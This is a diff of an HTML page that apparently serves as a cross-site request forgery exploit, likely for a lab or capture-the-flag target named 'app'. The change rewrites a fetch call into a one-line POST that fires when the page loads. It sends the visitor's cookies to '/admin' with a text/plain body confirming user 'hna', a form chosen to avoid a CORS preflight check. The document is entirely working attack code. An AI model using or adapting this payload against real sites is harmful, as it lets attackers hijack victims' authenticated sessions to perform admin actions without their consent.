@@ -8,34 +8,13 @@
 <body>
     <script type="text/javascript">
         document.addEventListener("DOMContentLoaded", function() {
-            // Dữ liệu cần gửi
-            const data = {
-                username: "hna",
-                confirm: "yes"
-            };
-
-            // Chuyển đổi dữ liệu sang JSON
-            const JSONdata = JSON.stringify(data);
-
+            
             // Gửi yêu cầu POST bằng fetch API
-            fetch("http://app/admin", {
-                method: "POST",
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSONdata,
-            })
-            .then(response => response.text())
-            .then(responseText => {
-                // Xử lý phản hồi từ server
-                console.log(responseText);
-                // Hiển thị phản hồi lên trang web
-                document.getElementById("response").innerText = responseText;
-            })
-            .catch(error => console.error('Error:', error));
+            fetch('https://app/admin', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"username":"hna","confirm":"yes"}'});
+            
         });
     </script>
 
-    <div id="response">Waiting for response...</div>
+    <div id="response">Waiting for response1...</div>
 </body>
 </html>
